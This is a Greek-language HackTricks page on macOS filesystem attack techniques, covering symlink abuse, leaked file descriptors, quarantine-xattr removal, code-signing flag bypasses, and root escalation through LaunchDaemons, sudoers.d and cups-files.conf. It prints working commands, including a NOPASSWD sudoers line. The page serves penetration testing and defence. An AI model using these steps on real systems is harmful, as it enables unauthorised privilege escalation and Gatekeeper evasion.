# macOS FS Tricks

{{#include ../../../../banners/hacktricks-training.md}}

## Συνδυασμοί POSIX permissions

Για έναν **directory**, τα τρία permission bits σημαίνουν κάτι διαφορετικό από ό,τι σε ένα κανονικό αρχείο. Το `chmod(1)` αποκαλεί το execute bit "**search**" όταν εφαρμόζεται σε έναν directory:<sup>[[2]](#references)</sup>

> `0100` Για αρχεία, επιτρέπει την εκτέλεση από τον owner. Για directories, επιτρέπει στον owner να κάνει **search** στον directory.

- **read** - μπορείτε να **enumerate** τις entries του directory (να εμφανίσετε τα ονόματα).
- **write** - μπορείτε να **create, rename και delete entries** στον directory. Σημειώστε ότι αυτό είναι ιδιότητα του *containing* directory και όχι του αρχείου: μπορείτε να διαγράψετε ένα αρχείο που δεν μπορείτε να διαβάσετε ή να τροποποιήσετε, εφόσον μπορείτε να γράψετε στον parent directory του.
- Για να διαγράψετε έναν **subdirectory**, πρέπει να είναι κενός, κάτι που με τη σειρά του απαιτεί επαρκή δικαιώματα για την αφαίρεση όλων των περιεχομένων του.
- Αν ο directory έχει το **sticky bit** (`S_ISVTX`, όπως το `/tmp`), αυτό περιορίζεται — το POSIX ορίζει ότι μια process μπορεί τότε να διαγράψει ή να κάνει rename σε αρχεία που περιέχονται σε αυτόν μόνο αν είναι owner του αρχείου, owner του directory ή έχει τα κατάλληλα privileges.<sup>[[1]](#references)</sup>
- **execute / search** - **επιτρέπεται να κάνετε traverse** τον directory. Η επίλυση του pathname εντοπίζει κάθε component "στον directory που καθορίζεται από τον predecessor του", επομένως η **απώλεια δικαιωμάτων search σε οποιοδήποτε μεμονωμένο component του path prefix καθιστά οτιδήποτε βρίσκεται από κάτω unreachable μέσω path**, ακόμη και αν το leaf file είναι world-readable.<sup>[[1]](#references)</sup>

### Επικίνδυνοι Συνδυασμοί

**Πώς να κάνετε overwrite ένα αρχείο/folder που ανήκει στον root**, όταν:

- Ένας parent **directory owner** στο path είναι ο user
- Ένας parent **directory owner** στο path είναι ένα **users group** με **write access**
- Ένα **users group** έχει **write** access στο **file**

Με οποιονδήποτε από τους προηγούμενους συνδυασμούς, ένας attacker θα μπορούσε να **inject** ένα **sym/hard link** στο αναμενόμενο path, ώστε να επιτύχει privileged arbitrary write.

### Folder root R+X special case

Αυτό προκύπτει άμεσα από τον παραπάνω κανόνα επίλυσης του pathname. Αν ένας **directory παρέχει μόνο R+X στον root**, τα αρχεία που βρίσκονται μέσα σε αυτόν είναι unreachable *μέσω path* για όλους τους υπόλοιπους — όμως τα permission bits των ίδιων των **files** μπορεί να παραμένουν permissive. Ο directory είναι το μοναδικό εμπόδιο.

Επομένως, οποιοδήποτε primitive που σας επιτρέπει να βγάλετε το file **από αυτόν τον directory** — μια privileged process που **μετακινεί/κάνει rename/copy** ενός path που έχει επιλέξει ο attacker σε μια τοποθεσία την οποία μπορείτε να κάνετε traverse — μετατρέπεται σε arbitrary read, χωρίς να χρειάζεται ποτέ να παρακάμψετε το ίδιο το mode του file:
```bash
# Reproduce the primitive locally
sudo mkdir -p /tmp/locked && sudo chmod 700 /tmp/locked
sudo sh -c 'echo secret > /tmp/locked/data.txt; chmod 644 /tmp/locked/data.txt'

ls -l /tmp/locked/data.txt   # Permission denied: cannot even stat through the directory
cat /tmp/locked/data.txt     # Permission denied

# The file itself is mode 644 - only the parent directory's search bit blocks you.
sudo ls -l /tmp/locked/
```
Αναζητήστε privileged file movers (installers, log rotators, crash/diagnostic collectors, backup και λειτουργίες "export") που δέχονται source path από lower-privileged user.

## Symbolic Link / Hard Link

### Permissive file/folder

Αν μια privileged process γράφει δεδομένα σε **file** που θα μπορούσε να **ελέγχεται** από έναν **lower privileged user** ή που θα μπορούσε να έχει **δημιουργηθεί προηγουμένως** από έναν lower privileged user, ο user θα μπορούσε απλώς να το **κατευθύνει σε άλλο file** μέσω ενός Symbolic ή Hard link, και η privileged process θα γράψει σε αυτό το file.

Ελέγξτε τις άλλες ενότητες όπου ένας attacker θα μπορούσε να **καταχραστεί ένα arbitrary write για να κλιμακώσει privileges**.

### Open `O_NOFOLLOW`

Σύμφωνα με το [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"Αν χρησιμοποιείται το `O_NOFOLLOW` στη mask και το target file που περνά στο `open()` είναι symbolic link, τότε το `open()` θα αποτύχει."* Ελέγχεται μόνο το **τελικό** component — κάθε **ενδιάμεσο** component εξακολουθεί να επιλύεται και να ακολουθείται. Επομένως, ένας developer που "προστάτευσε" ένα write με `O_NOFOLLOW` μπορεί ακόμη να δεχτεί επίθεση μέσω τοποθέτησης ενός symlink σε οποιοδήποτε **parent directory** του target path.<sup>[[3]](#references)</sup>

Η ίδια man page τεκμηριώνει τα flags που κλείνουν πραγματικά αυτό το κενό:<sup>[[3]](#references)</sup>

- **`O_NOFOLLOW_ANY`** — *"αν ... οποιοδήποτε component του path που περνά στο `open()` είναι symbolic link, τότε το `open()` θα αποτύχει."*
- **`O_RESOLVE_BENEATH`** — *"αν ... η καθορισμένη path resolution διαφύγει από το directory που σχετίζεται με το fd, τότε το `openat()` θα αποτύχει."*

Διαφορετικά, το `openat()` relative σε ένα directory FD που έχετε ήδη επικυρώσει ή το `realpath()` + επανεπικύρωση είναι οι εναπομείναντες τρόποι για να αποτρέψετε mid-path symlink swaps.

## .fileloc

Files με extension **`.fileloc`** μπορούν να δείχνουν σε άλλες applications ή binaries, έτσι ώστε όταν ανοίγουν, να εκτελείται η application/binary που υποδεικνύουν.\
Παράδειγμα:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## File Descriptors

### Leak FD (no `O_CLOEXEC`)

Αν μια κλήση προς `open` δεν περιλαμβάνει το flag `O_CLOEXEC`, το file descriptor θα κληρονομηθεί από το child process. Επομένως, αν ένα privileged process ανοίξει ένα privileged file και εκτελέσει ένα process που ελέγχεται από τον attacker, ο attacker θα **κληρονομήσει το FD προς το privileged file**.

Το canonical παράδειγμα είναι το **`DYLD_PRINT_TO_FILE` LPE στο OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>

- Το `dyld` τιμούσε το `DYLD_PRINT_TO_FILE=/path` ακόμη και σε **restricted (suid root) binaries**, επειδή η συγκεκριμένη μεταβλητή γινόταν parse εκτός της `processDyldEnvironmentVariable()`.
- Εκτελούσε `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, οπότε **δημιουργούσε ένα file ιδιοκτησίας root σε αυθαίρετο path**.
- Το FD **δεν γινόταν ποτέ close και δεν είχε close-on-exec flag**, επομένως κάθε child του suid binary κληρονομούσε ένα **writable FD προς ένα file ιδιοκτησίας root**.
- Η εκτέλεση, για παράδειγμα, του `DYLD_PRINT_TO_FILE=/etc/target suid_binary` και στη συνέχεια η ανάγνωση του inherited FD number στο child επέτρεπε αυθαίρετα writes σε files ιδιοκτησίας root· το `fcntl(fd, F_SETFL, 0)` μπορούσε ακόμη και να αφαιρέσει το `O_APPEND`, επιτρέποντας overwrite αντί για append.

Το ίδιο μοτίβο εμφανίζεται κάθε φορά που ένα privileged process ανοίγει ένα file **πριν** εκτελέσει μέσω `exec` κάτι που ελέγχετε (helper tools, editors τύπου `crontab` που καλούνται μέσω του `$EDITOR`, log/debug files που ανοίγουν από path σε env var...). Enumerate τα FDs που κληρονομήσατε με:
```bash
# From inside the child process
ls -l /dev/fd/
# or
lsof -p $$
```
Οτιδήποτε πάνω από `2` που δείχνει σε ένα αρχείο το οποίο δεν μπορείτε να ανοίξετε οι ίδιοι αποτελεί primitive arbitrary-write (ή arbitrary-read).

## Αποφύγετε τα κόλπα με τα quarantine xattrs

### Αφαιρέστε το
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable flag

Αν ένα αρχείο/φάκελος έχει αυτό το immutable attribute, δεν θα είναι δυνατή η προσθήκη ενός xattr σε αυτόν
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### File systems χωρίς υποστήριξη xattr

Δεν αποθηκεύουν εγγενώς **extended attributes** όλα τα file systems που μπορεί να κάνει mount το macOS. Τα HFS+ και APFS το κάνουν, ενώ τα **FAT32, exFAT και τα περισσότερα NFS mounts όχι** — το macOS τα εξομοιώνει γράφοντας ένα **AppleDouble** side file με όνομα `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>

Αυτό έχει σημασία για το quarantine, επειδή το xattr διατηρείται μόνο αν μπορεί πράγματι να γραφτεί **και να διαβαστεί ξανά** από το ίδιο volume:
```bash
# Check whether a mount point round-trips xattrs at all
xattr -w com.apple.quarantine "0081;00000000;test;" /Volumes/SOMEUSB/file
xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
```
Εάν το volume διαβαστεί αργότερα μέσω μιας διαδρομής που αγνοεί το companion `._` (ή το companion αφαιρεθεί/διαγραφεί), το αρχείο φτάνει **χωρίς quarantine flag** — και ένα unquarantined `.app` αρκεί για να παρακάμψει το App Sandbox, όπως καλύπτεται στο [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).

### writeextattr ACL

Αυτό το ACL αποτρέπει την προσθήκη `xattrs` στο αρχείο
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

Η μορφή αρχείου **AppleDouble** αντιγράφει ένα αρχείο, συμπεριλαμβανομένων των ACEs του.

Στον [**πηγαίο κώδικα**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) είναι δυνατό να δούμε ότι η αναπαράσταση κειμένου του ACL που είναι αποθηκευμένη μέσα στο xattr με όνομα **`com.apple.acl.text`** θα οριστεί ως ACL στο αποσυμπιεσμένο αρχείο. Επομένως, αν συμπιέσετε μια εφαρμογή σε ένα αρχείο zip με τη μορφή αρχείου **AppleDouble**, χρησιμοποιώντας ένα ACL που εμποδίζει την εγγραφή άλλων xattrs σε αυτό... το quarantine xattr δεν ορίστηκε στην εφαρμογή:

Δείτε την [**αρχική αναφορά**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) για περισσότερες πληροφορίες.<sup>[[6]](#references)</sup>

Για να το αναπαραγάγουμε, πρέπει πρώτα να λάβουμε το σωστό string του acl:
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
(Σημειώστε ότι ακόμη και αν αυτό λειτουργεί, το sandbox γράφει πρώτα το quarantine xattr)

Δεν είναι πραγματικά απαραίτητο, αλλά το αφήνω εκεί για κάθε ενδεχόμενο:


{{#ref}}
macos-xattr-acls-extra-stuff.md
{{#endref}}

## Bypass ελέγχων υπογραφής

### Bypass ελέγχων platform binaries

Ορισμένοι έλεγχοι ασφαλείας ελέγχουν αν το binary είναι **platform binary**, για παράδειγμα για να επιτρέψουν τη σύνδεση σε μια υπηρεσία XPC. Ωστόσο, όπως παρουσιάζεται στο https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, είναι δυνατή η παράκαμψη αυτού του ελέγχου με τη λήψη ενός platform binary (όπως το /bin/ls) και την εισαγωγή του exploit μέσω του dyld, χρησιμοποιώντας τη μεταβλητή περιβάλλοντος `DYLD_INSERT_LIBRARIES`.<sup>[[7]](#references)</sup>

### Bypass των flags `CS_REQUIRE_LV` και `CS_FORCED_LV`

Είναι δυνατό ένα binary που εκτελείται να τροποποιήσει τα δικά του flags, παρακάμπτοντας τους ελέγχους, με κώδικα όπως ο παρακάτω:<sup>[[7]](#references)</sup>
```c
// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
int pid = getpid();
NSString *exePath = NSProcessInfo.processInfo.arguments[0];

uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
status |= 0x2000; // CS_REQUIRE_LV
csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS

status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
```
## Bypass Code Signatures

Τα Bundles περιέχουν το αρχείο **`_CodeSignature/CodeResources`**, το οποίο περιέχει το **hash** κάθε **file** μέσα στο **bundle**. Σημειώστε ότι το hash του CodeResources είναι επίσης **embedded στο executable**, οπότε δεν μπορούμε να το τροποποιήσουμε ούτε αυτό.

Ωστόσο, υπάρχουν ορισμένα files των οποίων η signature δεν θα ελεγχθεί. Αυτά έχουν το key `omit` στο plist, όπως:
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/index.html)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
Είναι δυνατό να υπολογίσετε την υπογραφή ενός resource από το CLI με:
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## Mount dmgs

Ένας χρήστης μπορεί να προσαρτήσει ένα προσαρμοσμένο dmg που έχει δημιουργηθεί ακόμη και πάνω από ορισμένους υπάρχοντες φακέλους. Έτσι μπορείτε να δημιουργήσετε ένα προσαρμοσμένο πακέτο dmg με προσαρμοσμένο περιεχόμενο:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
Συνήθως το macOS κάνει mount τον δίσκο επικοινωνώντας με το Mach service `com.apple.DiskArbitrarion.diskarbitrariond` (που παρέχεται από το `/usr/libexec/diskarbitrationd`). Αν προσθέσετε την παράμετρο `-d` στο αρχείο plist των LaunchDaemons και κάνετε επανεκκίνηση, θα αποθηκεύει logs στο `/var/log/diskarbitrationd.log`.\
Ωστόσο, είναι δυνατό να χρησιμοποιήσετε εργαλεία όπως τα `hdik` και `hdiutil` για απευθείας επικοινωνία με το kext `com.apple.driver.DiskImages`.

## Αυθαίρετες εγγραφές

### Περιοδικά sh scripts

Αν το script σας μπορεί να ερμηνευτεί ως **shell script**, θα μπορούσατε να αντικαταστήσετε το **`/etc/periodic/daily/999.local`** shell script, το οποίο θα εκτελείται κάθε μέρα.

Μπορείτε να **προσομοιώσετε** την εκτέλεση αυτού του script με: **`sudo periodic daily`**

### Daemons

Γράψτε ένα αυθαίρετο **LaunchDaemon**, όπως το **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, με ένα plist που εκτελεί ένα αυθαίρετο script, όπως:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
Απλώς δημιουργήστε το script `/Applications/Scripts/privesc.sh` με τις **εντολές** που θα θέλατε να εκτελέσετε ως root.

### Sudoers File

Αν έχετε **arbitrary write**, θα μπορούσατε να δημιουργήσετε ένα αρχείο μέσα στον φάκελο **`/etc/sudoers.d/`**, παραχωρώντας στον εαυτό σας δικαιώματα **sudo**.

### Αρχεία PATH

Το αρχείο **`/etc/paths`** είναι ένα από τα κύρια σημεία που συμπληρώνουν τη μεταβλητή περιβάλλοντος PATH. Πρέπει να είστε root για να το αντικαταστήσετε, αλλά αν ένα script από **privileged process** εκτελεί κάποια **εντολή χωρίς το πλήρες path**, ενδέχεται να μπορείτε να κάνετε **hijack** τροποποιώντας αυτό το αρχείο.

Μπορείτε επίσης να γράψετε αρχεία στο **`/etc/paths.d`** για να φορτώσετε νέους φακέλους στη μεταβλητή περιβάλλοντος `PATH`.

### cups-files.conf

Αυτή η τεχνική χρησιμοποιήθηκε σε [αυτό το writeup](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[[8]](#references)</sup>

Δημιουργήστε το αρχείο `/etc/cups/cups-files.conf` με το ακόλουθο περιεχόμενο:
```
ErrorLog /etc/sudoers.d/lpe
LogFilePerm 777
<some junk>
```
Αυτό θα δημιουργήσει το αρχείο `/etc/sudoers.d/lpe` με δικαιώματα 777. Τα επιπλέον άχρηστα δεδομένα στο τέλος χρησιμοποιούνται για να ενεργοποιηθεί η δημιουργία του error log.

Στη συνέχεια, γράψτε στο `/etc/sudoers.d/lpe` το απαραίτητο config για privilege escalation, όπως `%staff ALL=(ALL) NOPASSWD:ALL`.

Έπειτα, τροποποιήστε ξανά το αρχείο `/etc/cups/cups-files.conf`, ορίζοντας `LogFilePerm 700`, ώστε το νέο sudoers αρχείο να γίνει έγκυρο μέσω του `cupsctl`.

### Sandbox Escape

Είναι δυνατό να γίνει escape από το macOS sandbox με ένα FS arbitrary write. Για ορισμένα παραδείγματα, δείτε τη σελίδα [macOS Auto Start](../../../../macos-auto-start-locations.md), αλλά μια συνηθισμένη μέθοδος είναι η εγγραφή ενός Terminal preferences file στο `~/Library/Preferences/com.apple.Terminal.plist`, το οποίο εκτελεί μια εντολή κατά την εκκίνηση, και η κλήση του μέσω του `open`.

## Δημιουργία εγγράψιμων αρχείων ως άλλοι χρήστες

Ένα πολύ συνηθισμένο privesc primitive είναι να κάνετε μια **privileged process να δημιουργήσει ένα αρχείο για εσάς** σε έναν κατάλογο που ελέγχετε και, στη συνέχεια, να διατηρήσετε **write access** σε αυτό το αρχείο. Απαιτούνται δύο στοιχεία:

1. Ένας κατάλογος που σας ανήκει (ή στον οποίο μπορείτε να ορίσετε ένα **inheritable ACL**), ώστε οτιδήποτε δημιουργείται μέσα σε αυτόν να κληρονομεί τα permissions σας.
2. Μια privileged/`suid` process στην οποία μπορείτε να υποδείξετε **πού** να δημιουργήσει ένα αρχείο — συνήθως μέσω μιας debug/logging environment variable, ενός config file ή του XPC API ενός helper.

Το **inheritable ACL** είναι αυτό που κάνει το δημιουργημένο αρχείο εγγράψιμο από εσάς, παρόλο που ανήκει σε άλλον χρήστη. Τα flags κληρονομικότητας `file_inherit` / `directory_inherit` τεκμηριώνονται στο [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):<sup>[[2]](#references)</sup>
```bash
DIRNAME=/tmp/inherit_test
mkdir -p "$DIRNAME"

# file_inherit + directory_inherit => everything created inside is writable by me
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit" "$DIRNAME"

ls -lde "$DIRNAME"   # confirm the ACE is present
```
Τώρα οποιοδήποτε αρχείο δημιουργεί μια διεργασία με privileged δικαιώματα μέσα στο `$DIRNAME` είναι **εγγράψιμο από εσένα**. Αν αυτός ο κατάλογος είναι επίσης μια τοποθεσία από την οποία γίνεται αργότερα **εκτέλεση ως root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, ένας κατάλογος LaunchDaemon...), αυτό οδηγεί άμεσα σε root escalation. Δες τις ενότητες [Sudoers File](#sudoers-file) και [cups-files.conf](#cups-filesconf) παραπάνω για το τι πρέπει να γράψεις μόλις αποκτήσεις το αρχείο.

Για ένα πλήρες worked example της αλυσίδας «η μεταβλητή env κάνει μια διεργασία root να δημιουργήσει ένα αρχείο και το FD διαρρέει σε εσένα», δες την ενότητα [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) παραπάνω.

## POSIX Κοινόχρηστη μνήμη

Η **POSIX κοινόχρηστη μνήμη** επιτρέπει σε διεργασίες σε POSIX-compliant λειτουργικά συστήματα να έχουν πρόσβαση σε μια κοινή περιοχή μνήμης, διευκολύνοντας την ταχύτερη επικοινωνία σε σύγκριση με άλλες μεθόδους inter-process communication. Αυτό περιλαμβάνει τη δημιουργία ή το άνοιγμα ενός αντικειμένου shared memory με τη `shm_open()`, τον ορισμό του μεγέθους του με τη `ftruncate()` και τη χαρτογράφησή του στον χώρο διευθύνσεων της διεργασίας μέσω της `mmap()`. Στη συνέχεια, οι διεργασίες μπορούν να διαβάζουν και να γράφουν απευθείας σε αυτήν την περιοχή μνήμης. Για τη διαχείριση της ταυτόχρονης πρόσβασης και την αποτροπή καταστροφής δεδομένων, χρησιμοποιούνται συχνά μηχανισμοί συγχρονισμού, όπως mutexes ή semaphores. Τέλος, οι διεργασίες αποχαρτογραφούν και κλείνουν την κοινόχρηστη μνήμη με τις `munmap()` και `close()` και, προαιρετικά, αφαιρούν το αντικείμενο μνήμης με τη `shm_unlink()`. Αυτό το σύστημα είναι ιδιαίτερα αποτελεσματικό για αποδοτικό και γρήγορο IPC σε περιβάλλοντα όπου πολλές διεργασίες χρειάζεται να έχουν γρήγορη πρόσβαση σε κοινόχρηστα δεδομένα.

<details>

<summary>Παράδειγμα κώδικα Producer</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>Παράδειγμα κώδικα Consumer</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

Τα **macOSCguarded descriptors** είναι μια λειτουργία ασφαλείας που εισήχθη στο macOS για να ενισχύσει την ασφάλεια και την αξιοπιστία των **file descriptor operations** σε εφαρμογές χρηστών. Αυτά τα guarded descriptors παρέχουν έναν τρόπο συσχέτισης συγκεκριμένων περιορισμών ή "guards" με file descriptors, οι οποίοι επιβάλλονται από τον kernel.

Αυτή η λειτουργία είναι ιδιαίτερα χρήσιμη για την αποτροπή συγκεκριμένων κατηγοριών ευπαθειών ασφαλείας, όπως η **μη εξουσιοδοτημένη πρόσβαση σε αρχεία** ή οι **συνθήκες ανταγωνισμού**. Αυτές οι ευπάθειες εμφανίζονται, για παράδειγμα, όταν ένα thread αποκτά πρόσβαση σε ένα file description, παρέχοντας **σε ένα άλλο ευάλωτο thread πρόσβαση σε αυτό**, ή όταν ένα file descriptor **κληρονομείται** από μια ευάλωτη child process. Ορισμένες συναρτήσεις που σχετίζονται με αυτήν τη λειτουργικότητα είναι:

- `guarded_open_np`: Ανοίγει ένα FD με guard
- `guarded_close_np`: Το κλείνει
- `change_fdguard_np`: Αλλάζει τα guard flags σε έναν descriptor (ακόμη και αφαιρώντας την προστασία guard)

## References

- [1] [POSIX.1-2024 — Base Definitions, Ch. 4 (Δικαιώματα πρόσβασης σε αρχεία, προστασία καταλόγων, επίλυση pathname)](https://pubs.opengroup.org/onlinepubs/9799919799/basedefs/V1_chap04.html)
- [2] [Σελίδα man του [`chmod(1)`]](https://keith.github.io/xcode-man-pages/chmod.1.html) (bit αναζήτησης/εκτέλεσης καταλόγου, flags κληρονομικότητας ACL)
- [3] [Σελίδα man του [`open(2)`]](https://keith.github.io/xcode-man-pages/open.2.html) (`O_NOFOLLOW`, `O_NOFOLLOW_ANY`, `O_RESOLVE_BENEATH`)
- [4] [SektionEins - OS X 10.10 DYLD_PRINT_TO_FILE Local Privilege Escalation](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html) (leaked FD χωρίς close-on-exec)
- [5] [The Eclectic Light Company - Ποια file systems και cloud services διατηρούν extended attributes;](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)
- [6] [Microsoft - Το Achilles heel του Gatekeeper: η αποκάλυψη μιας ευπάθειας στο macOS](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)
- [7] [Mickey (Jhftss) - Μια νέα εποχή για macOS Sandbox Escapes](https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/)
- [8] [Kandji - Αποκαλύπτοντας ευπάθειες της Apple: Η ιστορία του audit των diskarbitrationd και storagekitd, Μέρος 1](https://www.kandji.io/blog/macos-audit-story-part1)

{{#include ../../../../banners/hacktricks-training.md}}
